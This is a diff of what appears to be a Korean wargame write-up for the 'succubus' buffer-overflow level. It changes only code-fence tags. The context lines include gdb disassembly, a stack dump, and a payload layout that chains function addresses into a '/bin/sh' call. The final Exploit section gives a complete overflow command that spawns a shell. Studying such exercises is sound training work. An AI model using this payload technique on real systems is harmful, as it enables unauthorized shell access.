@@ -144,7 +144,7 @@ void *memset(void *dest, int c, size_t count);
     }
 ```
 
-```assembly
+```
 0x8048860 <main+88>:	mov    DWORD PTR [%ebp-44],0x80487ec	#addr = &DO
 0x8048867 <main+95>:	push   4
 0x8048869 <main+97>:	lea    %eax,[%ebp-44]	#ebp-44 = &addr
@@ -227,7 +227,7 @@ void MO(char *cmd)
 
 `|dummy(44)|&DO|&GYE|&GUL|&YUT|&MO|dummy(4)|\xbf\xbf\xbf\xbf|"/bin/sh"|`
 
-```c
+```
 (gdb) x/32x $ebp
 0xbffffa7c:	0x00000000	0x90909090	0xbfbfbfbf	0x6e69622f
 0xbffffa8c:	0x0068732f	0x08048808	0x00000002	0xbffffab4
@@ -260,7 +260,7 @@ payload 시나리오 :
 
 ### 0x02. Exploit
 
-```sh
+```
 ./succubus `python -c 'print "A"*44+"\xec\x87\x04\x08"+"\xbc\x87\x04\x08"+"\x8c\x87\x04\x08"+"\x5c\x87\x04\x08"+"\x24\x87\x04\x08"+"\x90"*4+"\xb8\xfa\xff\xbf"+"/bin/sh"'`
 ```
 
